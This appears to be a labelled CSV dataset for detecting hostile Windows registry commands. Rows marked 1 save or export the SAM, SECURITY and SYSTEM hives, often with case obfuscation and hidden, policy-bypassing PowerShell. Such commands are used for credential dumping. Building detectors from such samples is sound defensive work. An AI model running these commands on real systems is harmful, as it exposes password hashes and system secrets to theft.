text,label
cMD.ExE /C StART /b reg   ExpORt   HKEy_LOCal_MaChiNe\sECURity  C:\userS\pUBLIC\rEGIstRy_eXPOrt.REg,1
"Reg  reStOrE  ""hkEY_USERs\soFTWaRE\MiCROsOft\WiNdOws\CurrENtVerSiOn\sUBkEY19""  ""hkeY_uSeRS\HKeY_LOCal_maCHinE\sOfTwaRe\wOW6432NoDE_974""",0
pwsh -noprofile -c reg  export hklm\system   %temp%\sec_backup.dat,1
"reg   quERY   ""Hkey_LoCaL_mAchInE\hkey_locaL_MACHinE\soFtWAre\PoLiciES\mICrOsOfT\SubkEY23""   /f",0
"reg.exe  compare  ""hkey_current_user\hkey_local_machine\software\policies\microsoft""  ""hkey_current_user\software\myapp\settings_467""",0
"rEG  COmpAre  ""hKEy_lOCal_MaCHinE\sOFtWAre\GOoGLe\cHRoMe\sUbKey27""  ""hKEy_LoCaL_macHInE\SOFtWARE\gOOGLE\cHromE_712""",0
cmD.ExE /c reG.exe EXPoRt   hKLM\Sam   c:\temP\sysTEM.HiVe,1
"CMd /c REG   save   ""hkeY_LOCal_mACHiNe\hKey_LoCAL_maCHiNe\sofTwarE\pOliCieS\MicrOSOFt""   ""c:\wINDOws\tEMp\sOFtWaRe_dumP.DAT""   /Y",0
"powershell -c reg.exe restore ""hkey_current_user\hkey_local_machine\software\wow6432node"" ""hkey_current_user\software\classes_685""",0
"Reg.exe   copy   ""HkeY_UseRS\ENVIrOnmenT\Subkey29""   ""Hkey_uSERs\SoftWare\mIcRosoFT\WindoWS\CuRrentvErsIon_331""",0
"reg.exe   delete   ""hkey_local_machine\software\classes""   /f",0
"start /b reg.exe save ""hkey_users\software\google\chrome"" ""c:\windows\temp\software_dump.dat""",0
"ReG.ExE rESTore ""HkeY_CURRenT_user\hkey_LOCAL_maCHiNe\sOfTWARE\poliCiEs\MiCROSofT\SUBkEY25"" ""HKEy_CUrrent_USEr\HKey_local_MaCHINe\softwaRe\WOw6432nOdE_753""",0
pOweRshEll -eXEc bYPASS -w HiDDeN -C reg.eXE sAVE hkEy_LOcal_MaCHINe\sECuriTy C:\TeMp\sySTem.HiVe,1
"rEG.eXe  aDD  ""HKEY_uSerS\SOFTWAre\MYAPp\SetTiNGS""  /V vErsiOn  /T REG_Sz  /D 1",0
Reg.ExE   SAVe HkLM\Sam  \\lOcalHOst\C$\__DUmP\sAM.bAK,1
pWSh -NoprofIle -C Reg   SaVE  HKlM\sam  c:\uSErS\pubLIC\reGIStRY_EXpoRt.rEG,1
"rEG.eXe   coMpAre   ""HkEY_loCaL_MAcHiNe\SoftWare\GooGLE\CHROmE""   ""hKEY_lOcaL_maCHiNe\hKeY_LoCAl_mAcHInE\sYstem\CurRENtcoNTRoLSeT\COntroL_752""",0
"reG.eXe  ResTOrE  ""HKEY_CUrREnT_UseR\CONtRoL pANEL\DEsKTop""  ""HkEY_CURrenT_USeR\cOnTrol paNEL\desktOp_590""",0
POWErshELL -ExEC byPaSS -w hIDdEn -C rEg.Exe EXPORT   hkey_Local_MaCHinE\sAM c:\USERs\pUbliC\rEGiSTRY_eXpOrT.ReG,1
cMD.Exe /c sTARt /b REG  eXpOrT  HKLm\SyStem c:\USerS\PublIC\regiSTry_ExpOrT.reG,1
c:\WinDoWS\sySTEM32\cmD.eXE /K ReG   EXPoRt   HKEY_LocAL_mACHinE\sEcUrItY  c:\TemP\systEM.hIve /y,1
PWSh -NoPrOfIlE -c Reg.ExE   saVE   hkLm\sysTeM %tEMp%\sEC_bAckup.daT,1
Cmd.eXe /c sTarT /b rEG.Exe saVE Hkey_loCaL_mAcHINE\seCuriTY  c:\UseRS\puBLic\regiSTRY_ExPoRt.reg,1
pwsh -noprofile -c reg  export  hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
"ReG.exE   DeleTE   ""hKEy_LOcaL_MaCHinE\ENvIRONmENt""   /V VeRSIon",0
"POwershelL -C rEg.Exe   SAvE   ""HkeY_LOcaL_MaChIne\hkey_LoCAl_MAChiNE\SofTWaRE\wow6432Node""   ""c:\temP\UsEr_sEtTiNgs.rEg""",0
"rEG.exe Unload ""HKcU\CoNtrol PaNel\DESktoP\SuBkey6"" /V vERsiON",0
"reg.EXE COmpARE ""Hkey_uSers\eNvIROnment\SuBKeY15"" ""HkeY_uSerS\hkEY_LoCAl_Machine\sOFtwArE\WOw6432Node_868""",0
pwSh -nOPROFILE -c reg  save   hKeY_LOcaL_MACHInE\SYSTEm   \.\C$ackup.REg /y,1
reg  export  hklm\system c:\temp\system.hive,1
"CMD /c Reg SAvE ""hKu\SoFtwArE\MYapp\setTingS\subKeY90"" ""%TEMP%\nOn_senSiTiVE.hiVe""",0
"Cmd /C powErShelL -C ""ReG sAvE HKEy_lOCAl_MaCHIne\SyStEm  c:\TeMP\SysteM.HiVE""",1
"pOWErSHElL -c reg.exe saVE ""HKEy_LOcAl_machINe\HkEY_locaL_mAcHInE\softWArE\POLICies\mICrOSoft\sUBkey5"" ""C:\USerS\PUBLIC\CHrOME_daTa.bAk"" /Y",0
PowERSHElL -COMmAnd REg  eXport Hkey_local_MAChINE\Sam   c:\WinDOWs\Temp\SAM.sAvE   /y,1
"stART /B rEg.eXE   dElETE   ""hKCu\syStEM\cURrEnTControLSeT\SERVICES\sUbKEy88""   /v vErsion",0
powershell -exec bypass -w hidden -c reg   save hklm\sam   \.\c$ackup.reg /y,1
powershell -command reg.exe save  hkey_local_machine\security   c:\users\public\registry_export.reg,1
pwsh -noprofile -c reg   export hklm\system  c:\users\public\registry_export.reg,1
"start /b reg restore ""hkey_users\hkey_local_machine\software\wow6432node\subkey86"" ""hkey_users\control panel\desktop_299""",0
"cmD /C PoWErsHEll -c ""Reg   EXpOrt   hkey_loCal_MACHiNe\sAM   \.\C$ACkup.reG""",1
powershell -exec bypass -w hidden -c reg save  hkey_local_machine\sam   \.\c$ackup.reg   /y,1
pOwErsHelL -eXec byPass -w HiddEN -c rEg   ExPoRT  hKEy_LoCal_MAChINe\SAm  \\LoCaLHOsT\c$\__dUMP\sAm.BaK  /Y,1
"rEG   save   ""hKEy_lOCAL_mACHinE\HkeY_lOCaL_MachinE\sYSTEm\cURRENtconTRoLsEt\ControL""   ""%teMP%\NOn_SENsiTIvE.HivE""",0
"reg.exe   query   ""hkcu\environment\subkey37""",0
"reg   query   ""hkey_users\software\policies\mycorp\subkey37""   /f",0
poWERSHEll -exEC BYpAss -W hiDDEN -c REG.eXe  EXPOrt   hkeY_LOCAL_MaChinE\systEm %Temp%\SEC_BaCkUp.DAT,1
"pOWERsheLl -C Reg SAVe ""hKEy_lOcal_MACHine\hKey_lOCAL_MAchiNe\SOFTwaRe\PolICIes\MICrosOFT\subkeY82"" ""D:\BAcKUp\rEgIsTRY_HivE.DAT"" /y",0
poWERShELL -ExEc bYPAsS -w hiddEN -C reG.eXe   saVe   HKEY_LOCAl_maCHInE\seCUrITy  C:\temP\sYsTEm.hIve,1
"pOweRShELl -C rEg.eXE  cOmPARe  ""HKeY_locaL_mACHine\hKeY_LOCal_mAcHinE\sOFTWaRe\wOW6432NOdE""  ""hkey_LOCAl_mAcHinE\softWArE\MICROsoFt\Windows\currentVErSION_682""",0
PoweRshELl -COMManD ReG   save  HKlM\sySTEM c:\teMP\sySTEM.HiVe,1
REG   ExPorT  hKLM\syStEM  c:\wIndoWS\tEMP\SaM.sAVe /Y,1
"rEG.ExE  cOPy  ""Hkey_cURREnT_User\softWaRE\GOOGLE\chRoMe\subkEY14""  ""hKeY_CURrENT_UsER\hKey_LOcAL_MAcHine\SYStEM\CuRREntconTROlseT\cOntROl_548""",0
"reG  ADd  ""HkeY_UserS\sOftwARE\POlicIeS\MyCorP""  /v vERSioN",0
"start /b reg restore ""hkey_local_machine\software\policies\mycorp\subkey69"" ""hkey_local_machine\environment_272""",0
reg.exe export hkey_local_machine\security  %temp%\sec_backup.dat   /y,1
"reg.exe unload ""hkcu\software\classes"" /v path",0
pwsh -noprofile -c reg   save hkey_local_machine\system %temp%\sec_backup.dat,1
"REg.eXE   resTorE   ""HKey_LocaL_MACHINE\COntROl PaNeL\dEsKtOP""   ""hKey_LocaL_mACHiNe\sOftwARE\MICRoSoft\wInDOws\currenTveRSiOn_859""",0
c:\wINDows\sYSTEm32\CMd.Exe /k rEg.eXe  SaVe  HkEY_loCAL_maChiNe\SAm   c:\WINdOwS\teMp\sAm.sAVe  /y,1
POwersHEll -ExEC ByPASS -W hIdDEn -c rEg  EXporT  hKeY_lOCAl_mAcHINE\systeM  c:\wiNdows\tEmp\sAM.sAVE,1
poWERshELL -cOMMaND rEG.exE saVe  hkEY_lOcaL_macHINE\Sam  c:\TEMp\SysteM.HIve   /y,1
C:\wiNdoWs\sysTEM32\cmD.Exe /K REG  SAVe HKeY_loCAl_MaCHinE\sAM  c:\UseRS\pUblIc\RegiStRY_eXpORt.rEG /y,1
"poweRsheLL -c rEg.eXE   DElEte   ""hkEy_CuRrEnT_uSeR\SOftWARE\myaPP\SetTInGs\SUBkey57""   /V path",0
"STArt /B Reg.eXE ResTOrE ""HkEY_users\ENvIRONmENT"" ""HkEY_USers\HKEy_lOCAL_MAChiNe\soFtwArE\wow6432nOdE_851""",0
POweRsHeLL -ExeC BypaSS -W hidDeN -C REG.Exe  expOrT hkLM\SeCurItY c:\useRs\PublIC\RegIStRy_EXPORT.rEG  /Y,1
"reg compare ""hkcu\software\microsoft\windows\currentversion"" ""hkcu\hkey_local_machine\software\policies\microsoft_385""",0
"cMD /C Reg.Exe  qUery  ""hKEY_CuRRENT_UsEr\sOFtwArE\poLiCieS\MYcorP""  /V lAstUPDATE",0
"reG  UnLoAd  ""HkU\cONtROL PAnEL\Desktop""  /v path",0
powershell -exec bypass -w hidden -c reg.exe  save hklm\system  c:\windows\temp\sam.save /y,1
powershell -exec bypass -w hidden -c reg.exe  export   hklm\system   \.\c$ackup.reg,1
"reg COmpArE ""HKEY_LOcaL_mAcHINe\SOfTwaRE\pOlIcIeS\myCoRp"" ""hKEY_locAL_MAchIne\softWARe\MyApP\SetTings_792""",0
"start /B rEg   querY   ""HkcU\sOFtwarE\cLASseS""   /v pATh",0
"Reg.Exe DElEte ""HKCu\sOFtwaRe\MiCroSoFT\winDOWS\CurReNTversiON"" /v LASTuPdATE",0
POWeRSHell -Exec bYPAsS -w hiDDEn -c REg.Exe   ExPoRT hkEy_LOCAL_MacHiNE\sEcURity  C:\USErS\PUBLIc\RegistRy_eXPoRt.REg   /y,1
c:\windows\system32\cmd.exe /k reg.exe export   hklm\system \.\c$ackup.reg /y,1
rEG.Exe   ExpoRT hkEy_lOcAL_mAchiNe\SaM  \\lOcalHost\c$\__dumP\sAm.BAK,1
"cmd /c reg   restore   ""hkey_current_user\software\microsoft\windows\currentversion\subkey9""   ""hkey_current_user\control panel\desktop_302""",0
"reg.EXE save ""HKu\SoftwarE\MiCROSofT\WINdOws\CURreNtvErsiOn"" ""D:\BaCKUp\REGiStrY_hiVe.daT""",0
"CMd /C poWeRShELL -c ""REG.EXE  sAVE   HKLM\SEcUrItY  \.\C$ACKup.REg""",1
"cmd /c reg  delete  ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey59""  /v version",0
c:\wiNdOWs\SYSteM32\cmd.EXE /k reG.EXE  SAvE hKlm\sysTeM  %TeMP%\sEC_BackuP.DAT /y,1
c:\WINDOws\SysTEm32\cmd.exe /k ReG.EXe exPOrT  hKeY_LocaL_maChiNE\SYSteM  %tEmp%\sEc_baCkuP.Dat  /y,1
poWeRSHEll -CoMMand REg.ExE save HkeY_LocaL_MaChine\SeCUrITY c:\users\pubLIc\reGIStRY_exPoRt.REg,1
"powershell -c reg   unload   ""hku\hkey_local_machine\software\policies\microsoft\subkey77""   /v lastupdate",0
"rEG  CoMPARe  ""hKEY_userS\soFtware\googLe\chROmE\SubkeY91""  ""hKEY_USerS\SYSTem\CURRenTcOntrOlset\SErvIcES_624""",0
"reg.EXE   DElEte   ""hKey_CURReNt_USEr\SofTwaRE\clASseS""   /V lASTUpdATE",0
Reg.Exe  eXpoRt   hKLm\SECuRItY  %temP%\SEC_BACkUP.Dat,1
powershell -command reg.exe save  hkey_local_machine\sam  %temp%\sec_backup.dat /y,1
"REg.EXe   uNlOAD   ""HKCu\HKEy_loCAl_maChine\softWare\PolIcIES\mIcROSOFt""   /v LAsTUpDaTe",0
cmd.exe /c reg.exe   export   hkey_local_machine\system   \\localhost\c$\__dump\sam.bak,1
"REG.Exe  Query  ""Hkcu\HKeY_lOCAL_MaCHINe\sOFtWaRe\POliCieS\mICROSOfT\SUbkEy21""  /V VeRsiOn",0
c:\wiNDOWS\sysTem32\cMd.eXe /K reG.eXe  ExporT  HKey_LOCAl_macHinE\sYSTem  \\loCaLHoST\C$\__DUmp\SAM.baK,1
C:\winDOws\SYSTem32\CMd.EXe /k rEg.exE  savE hKEy_locaL_MaChinE\Sam c:\windowS\tEMP\sam.sAve /y,1
cmd.exe /c start /b reg save  hkey_local_machine\security   c:\users\public\registry_export.reg,1
"REG.exe  ADD  ""HKey_USeRS\EnVIrOnMENT""  /v veRSION  /t REG_DworD  /d ""1.0.0""",0
cmd.exe /c start /b reg   save hklm\sam   \\localhost\c$\__dump\sam.bak /y,1
reg,0
"cmd /c rEG SavE ""HkEy_lOcAl_mAchINE\HKeY_lOcAL_mAChINe\sySTEm\CUrrEnTconTROLset\cONtrOL\sUbkEY12"" ""D:\BACkUP\RegistRy_HIvE.dAT"" /y",0
"StArT /B REG.ExE ADD ""hKeY_loCAl_MACHINE\systEM\curRENtcOntrolseT\sERVIcES"" /f  /D ""1.0.0""",0
PoWeRsHElL -cOmMaND REg.eXe   SAVE   hklm\sYSteM c:\UseRS\puBLIc\ReGISTrY_EXpoRt.reG  /y,1
"rEg.eXE  adD  ""hKEy_uSeRs\HKey_lOCaL_mAChINe\soFtWarE\wOw6432noDE\SUBKEy64""  /v pATH    /d 1",0
PoWerSHELl -comManD REg   exPOrT hKEY_loCaL_MAcHiNe\SystEm  c:\WInDowS\tEmP\sam.saVe /Y,1
"ReG.ExE adD ""hKCU\HkEy_LocAL_mACHine\soFTware\WoW6432noDE\SubkEY60"" /V VERsiON",0
pOwERShELL -COMmaNd REG.eXe  sAve   hkLm\SecuritY \\lOCAlhOSt\c$\__dumP\sAM.BAk  /y,1
"cmd /C PoWERShEll -C ""REG   SAve hkLm\SAm %TEMp%\sEC_BacKUP.dat   /y""",1
"REG  aDd  ""HkCU\sOftwarE\poLICiES\mYcOrp\subkeY23""      /D ""1.0.0""",0
Cmd.EXe /C REG  SaVe   hKeY_LoCAL_MaCHINE\sYstem \.\C$AcKuP.rEg /y,1
"powershell -c reg.exe   copy   ""hkcu\software\myapp\settings\subkey32""   ""hkcu\software\classes_540""",0
"rEg.EXe  add  ""HkCU\sOftwArE\PoliCIes\mYcOrP\SUBkeY44""  /F  /t rEG_dWorD",0
pwsh -noprofile -c reg.exe  export  hklm\sam   c:\users\public\registry_export.reg,1
"reg   compare   ""hkey_users\software\myapp\settings\subkey92""   ""hkey_users\software\google\chrome_515""",0
"powershell -c reg.exe   query   ""hkey_current_user\environment\subkey42""   /v lastupdate",0
"ReG.Exe QUerY ""HKEY_lOCaL_MAChINe\sySTEm\curRenTCONtRolSEt\ServiCeS"" /f",0
"powershell -c reg.exe   delete   ""hkey_local_machine\software\microsoft\windows\currentversion""",0
ReG.eXe ExporT HKey_loCal_MACHine\SeCUrity  \\LOCAlHoST\c$\__dUmp\Sam.baK,1
"cmd /c reg.exe save ""hkey_local_machine\hkey_local_machine\software\wow6432node"" ""c:\users\public\chrome_data.bak"" /y",0
cMD.ExE /c stArt /B REG.eXe  SaVe HKLM\SYSTeM C:\WiNDOWS\teMp\SAm.SAve,1
"stART /b rEg  SAVE  ""HKey_locAl_MachinE\hKeY_LoCAl_MAcHINE\SOFtWARE\POlicieS\mIcrosOfT""  ""d:\BaCKuP\registRy_hiVE.DaT""  /Y",0
"reg.exe save ""hkey_users\software\classes"" ""d:\backup\registry_hive.dat""",0
"cMd /C PowerShELl -c ""REG  EXPort  hKeY_lOCaL_MaCHine\SEcuritY c:\usERS\puBlic\REgistry_exPORt.reG /Y""",1
"REg.eXE  QUeRY  ""HkU\sOftwARe\pOlicIes\mYCORp""  /v lastupDaTe",0
powershell -command reg.exe  save hklm\system  c:\temp\system.hive,1
"reg   save   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey2""   ""d:\backup\registry_hive.dat""",0
"REG.eXe resTore ""hKEY_LOcal_macHINe\SOftWare\goOgle\ChROme"" ""hKey_loCAl_mACHINe\SysteM\CurREnTconTroLsEt\sERVICES_427""",0
PoWErShEll -CoMMANd REg expoRt  HkLM\sEcURITy   C:\wINdOWS\TEmp\saM.sAvE  /y,1
cmd.exe /c start /b reg   export hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
reG.EXE   save   HKey_lOCAl_MAcHINE\sysTem \.\c$AcKUp.reg   /Y,1
"reg.exe   delete   ""hku\environment\subkey77""   /f",0
"reg.exe   add   ""hkcu\hkey_local_machine\software\policies\microsoft\subkey73""   /v lastupdate",0
"reg  query  ""hku\control panel\desktop""  /v version",0
c:\windows\system32\cmd.exe /k reg.exe save hkey_local_machine\system c:\windows\temp\sam.save /y,1
"reg.exe  copy  ""hkey_users\software\classes\subkey87""  ""hkey_users\software\myapp\settings_112""",0
"staRT /B ReG  RESToRe  ""hKeY_usERs\SoFtwARE\GOogle\cHrOme\SubkEy18""  ""HKEy_usErs\SOfTwAre\micRoSOft\WiNdoWS\curREntveRsIOn_720""",0
"starT /b rEG  UNLoad  ""HKEy_cUrrenT_USer\software\POlIcieS\mycOrp\suBKEy23""",0
"CMd /c ReG.ExE  deLete  ""HkU\COntrol PANeL\dEsktop\SUbkEy81""",0
CMd.Exe /c staRt /b rEg.eXE  sAVe hKLm\secUrity  \.\c$ackUp.rEG   /y,1
"cmd /c reg   copy   ""hkey_users\hkey_local_machine\software\policies\microsoft""   ""hkey_users\hkey_local_machine\software\wow6432node_657""",0
"reg copy ""hkcu\hkey_local_machine\software\wow6432node\subkey42"" ""hkcu\hkey_local_machine\system\currentcontrolset\control_450""",0
pwsh -noproFiLE -C REg.ExE   saVE   hKlM\sAM   %TeMP%\sEC_bAckup.DaT   /y,1
"staRt /b Reg   query   ""HkEy_CurrENT_USer\EnViRonmEnT""   /V LastUpDatE",0
POwErShEll -commANd REG sAVE   hKLM\sECUriTy   \\LoCaLhOst\C$\__DUMp\sam.BAK  /Y,1
reg  SaVE  hkLM\saM \.\c$aCKuP.rEg  /Y,1
"cmd /c reg.exe   unload   ""hkey_current_user\control panel\desktop\subkey88""   /f",0
"reg.exe  restore  ""hkcu\hkey_local_machine\system\currentcontrolset\control""  ""hkcu\system\currentcontrolset\services_787""",0
"Reg   rEsTore   ""HKEY_uSers\sOFtware\mICRosoFT\WindoWS\cURREntVErsIon\sUbkEy89""   ""hKey_UseRS\hkey_LOcAL_MAchINe\SOFTwarE\POLicIEs\mICrosoFT_680""",0
"reG COMparE ""HKu\SYstEM\cuRReNtcontRoLsEt\SeRvicES"" ""hku\hKEy_LOCAL_MAChinE\sySTEM\cURrEntconTrOLSET\cONTRoL_739""",0
"REG   compAre   ""Hkey_LOCAl_MaChINE\enVirOnmEnT""   ""HkEy_LocaL_mAchInE\conTrol pAneL\dESKtOp_970""",0
"powershell -c reg.exe copy ""hku\software\classes\subkey51"" ""hku\system\currentcontrolset\services_552""",0
"Reg.EXE   UNlOad   ""hkeY_LOCaL_MAcHInE\software\ClaSseS\sUbKEY37""   /f",0
powershell -command reg.exe   export  hkey_local_machine\security \.\c$ackup.reg,1
"rEg.EXE QUEry ""hKeY_useRs\hkeY_local_mAchinE\soFTwaRe\poLIcIES\MICroSOFT""",0
C:\WINdOWs\SystEm32\Cmd.Exe /k Reg.eXE save   hKLM\sEcUrIty \.\C$ACkup.Reg,1
"powershell -c reg.exe  compare  ""hkey_users\software\policies\mycorp\subkey85""  ""hkey_users\hkey_local_machine\system\currentcontrolset\control_660""",0
"cmD /c Reg copY ""HKeY_LoCaL_machIne\conTROL PanEL\deSKtOp"" ""hKEy_LOCaL_mAcHIne\SOfTWaRe\gooGle\cHrOme_794""",0
"reg.exe   compare   ""hkey_current_user\software\policies\mycorp""   ""hkey_current_user\software\policies\mycorp_217""",0
cmd.eXe /C rEg SaVe   hKeY_loCAL_macHiNE\SYStem  C:\wIndOWS\TEMP\sAm.SAVE  /y,1
powershell -exec bypass -w hidden -c reg.exe save hkey_local_machine\sam %temp%\sec_backup.dat,1
"Reg.exE delEte ""Hkey_uSErS\SOftWare\MYapp\SeTtINgs"" /V vERSIoN",0
"ReG   COpy   ""HKu\SoFTwARE\MYapP\SeTtINgs""   ""hku\conTROL paNeL\DESKtoP_210""",0
"PoWerShEll -C rEG compArE ""hkcu\SofTWaRE\poLIcieS\MYCOrP\sUBkEY65"" ""HkcU\Hkey_LoCAL_mACHINe\SOftwaRe\pOLICIeS\MIcROSOFT_864""",0
"pOwERSHEll -c rEg   UNlOAD   ""HkeY_Users\HKeY_LocAl_MAcHINe\SystEM\CUrrenTcoNtRolseT\conTrOl""   /v lASTupdAte",0
PwSh -nopRoFIlE -C rEG.exE   sAvE  HKeY_lOCAL_MacHine\sYsTem C:\TEMp\SYStEm.HivE /y,1
cmd.exe /c start /b reg.exe export hklm\sam \\localhost\c$\__dump\sam.bak   /y,1
cmd.exe /c start /b reg.exe  save hkey_local_machine\sam  c:\users\public\registry_export.reg,1
"rEg.EXE  rESTORE  ""hKEY_uSERs\SOfTWare\micrOSOFT\wINdOWs\CUrrENTVerSioN\SubkeY38""  ""hkey_USeRs\ContROl paNeL\DesKTop_246""",0
"POweRsHEll -c reG ADd ""hku\SofTwaRe\MiCRosOFt\WindoWS\cUrrENTVerSiOn"" /v VErsIoN",0
"REG   QueRy   ""HKCU\sofTWARE\POLIciES\MYcoRp\SUbkEy56""",0
"reg   QUErY   ""HKey_LOCAl_MacHiNe\sOfTwaRe\mYapp\seTtiNGs""   /V paTH",0
"cmD /C reg add ""HkeY_lOcaL_mAChIne\hKey_LocAL_MaCHiNe\sYsTEM\CUrRenTCoNtrolseT\contrOL\sUBkeY14"" /v lAStUPdATE /T REg_DWorD",0
"pOWersHEll -c REG.EXE  Save  ""hKey_Local_maChINe\hKeY_LOcal_MacHINE\sOFTwAre\WOW6432NoDe""  ""d:\backUP\REgIStry_hIve.dAt""",0
"reg.eXE  UNLoAd  ""HKEY_locAl_maCHINE\HKeY_LocaL_mACHiNE\SoftwaRe\PoLIcIeS\micROsOft""  /F",0
pwsh -noprofile -c reg save  hkey_local_machine\system  c:\temp\system.hive,1
POWeRsHell -ExEc ByPasS -w HidDEn -c reg.eXE  ExPORT  HKLM\sYStem  \.\C$AckUP.rEg,1
pwsH -noPrOFiLE -c reg.eXe   save HKlm\sYStEM   \.\C$aCkUP.ReG  /y,1
"REG   quERy   ""HKcu\cONTrol panEl\DEsktoP\subkeY98""",0
cmd.exe /c start /b reg.exe  save  hklm\security c:\users\public\registry_export.reg  /y,1
"sTaRt /b REg.ExE  cOMPARE  ""hkcU\hkey_lOcaL_maCHiNe\SOFtWaRE\POlICieS\mICRoSoFt\subkEy44""  ""HKCu\sOFtwaRE\PoliCies\MycOrP_783""",0
powershell -command reg.exe save hklm\sam %temp%\sec_backup.dat   /y,1
"rEG COMPare ""HkEY_loCAL_mAchIne\ENViroNmENt"" ""HkEy_lOCaL_MAchIne\SoFTwArE\mYapP\setTINGs_676""",0
"Reg  CoMPaRe  ""HkEy_local_machInE\enviRONmEnt""  ""hkEy_LoCAl_MaCHinE\ConTROL paNEl\DeSkTOp_127""",0
"CMd /C reg  ComPARe  ""HkEY_users\SoftWARE\MYaPP\SeTTInGS""  ""hKeY_uSERs\sOFTwARE\MICrOSOfT\windOws\CUrrenTVeRsion_372""",0
powershell -command reg export   hklm\security c:\windows\temp\sam.save,1
Cmd.EXe /C rEg   sAvE  hkEy_lOCAl_MaChiNE\sam   C:\users\PUbliC\REgiSTRy_exPOrT.rEg /Y,1
PWSH -NopRoFIle -C reg  eXpoRT   HKLM\SEcurItY   %tEMP%\SeC_bACKuP.daT /Y,1
cmd.exe /c reg.exe   export  hklm\sam   c:\users\public\registry_export.reg,1
pOwErsHell -ExEc bypaSS -w HiddeN -c rEg savE  HKlm\SEcUrItY c:\tEmP\SysTEM.HiVe,1
"sTArT /b REg SavE ""hKEY_loCAL_MaCHinE\hKeY_LOCaL_maCHIne\SyStEm\cuRReNTcONtrOlsEt\cOntrol\SUBKeY40"" ""c:\WiNDOws\TemP\sOftwaRe_DUmp.dAt"" /Y",0
REG.EXe  save HKey_LOcaL_macHiNe\SaM \.\C$aCKup.REG   /Y,1
"reg SavE ""Hkey_locaL_maCHIne\hkEY_lOCAL_macHine\sofTWAre\PoLiCieS\micrOsOFt\SubKey66"" ""C:\wINdows\TEMP\soFtWARE_dump.DaT""",0
"cmd /c reg  restore  ""hkey_current_user\software\myapp\settings""  ""hkey_current_user\software\microsoft\windows\currentversion_177""",0
poWeRshEll -eXeC bYpaSs -W HIDdEn -c REg   SaVE   hkEY_lOcAl_MacHinE\seCurITy   \.\C$ACKUP.ReG   /Y,1
cmd.eXE /C staRT /B Reg   SAve Hkey_LocAL_MaChIne\SyStEM  \\LocAlHOSt\c$\__duMP\sAM.Bak /y,1
"reg.EXe   ReStOre   ""HkeY_LocaL_maCHIne\sOftWARe\ClassEs""   ""hkEY_LOCal_maChInE\CONTrOL pANEL\DESKtOp_807""",0
"reg  qUerY  ""HkeY_CurRent_USeR\SYsTEM\cURRENTCOnTROlsET\sErVices\suBkey39""  /f",0
C:\wInDoWS\SysteM32\cMD.ExE /k rEg EXPORT HkeY_LoCaL_machInE\SAm  C:\WindowS\TemP\sam.savE,1
pWsh -NOPRofilE -C reG EXPort HklM\sYStem  C:\UsErs\pUblIc\ReGiSTRY_export.rEg,1
"cmd /c reg.exe delete ""hkey_local_machine\hkey_local_machine\software\policies\microsoft"" /v lastupdate",0
powershell -command reg.exe save  hkey_local_machine\system   c:\users\public\registry_export.reg /y,1
"POwerSHEll -c reG.eXE   SaVe   ""hkEY_CuRReNt_useR\envIRONMent""   ""C:\UsErS\pUBliC\CHROme_DaTa.bAk""   /Y",0
"ReG SaVe ""HKU\sOfTwARe\ClASSes"" ""D:\BaCkup\ReGIsTrY_hiVE.DAt"" /y",0
"rEg.exe AdD ""hku\eNViRonmenT"" /F /t reG_SZ /D ""1.0.0""",0
"StaRT /b Reg.ExE  COPy  ""hkEY_CurReNt_USeR\soFTware\pOlICies\myCOrp\sUBKeY92""  ""hkEy_CuRRENt_uSEr\soFTwaRe\micROsOfT\windoWS\cURrENtVeRsioN_551""",0
"POWErsHeLl -C rEg   copY   ""HKu\SOFtWARE\gooGle\chrOME""   ""HKU\hKEY_LOCAl_MACHine\SOFTWAre\poLicIes\MIcROsOfT_869""",0
c:\wINDOws\systEM32\cmd.exe /k reG.EXe eXPort  HkLm\sAM   %tEmP%\seC_BACkuP.dAt,1
poWERSHELl -COmmand Reg.eXe   expORT hkey_lOCaL_MAChINE\SAm %tEMP%\Sec_BacKuP.DAT,1
reg  SAVE  hkEy_LOCal_MAChine\SySTEM  \.\c$aCkuP.rEg,1
pwSh -nOPROFile -C reG  EXPoRT  hkEy_LocAL_mAcHINe\sEcUriTy %teMp%\sEC_BaCKuP.DAt   /Y,1
Cmd.ExE /C reg.Exe  SaVE   hKeY_lOCaL_maChINE\SeCURity  \\LOcALHOst\c$\__dUmP\SAm.Bak,1
"start /b reg copy ""hkcu\software\google\chrome"" ""hkcu\control panel\desktop_354""",0
pwsh -noprofile -c reg.exe  save   hklm\security   \\localhost\c$\__dump\sam.bak  /y,1
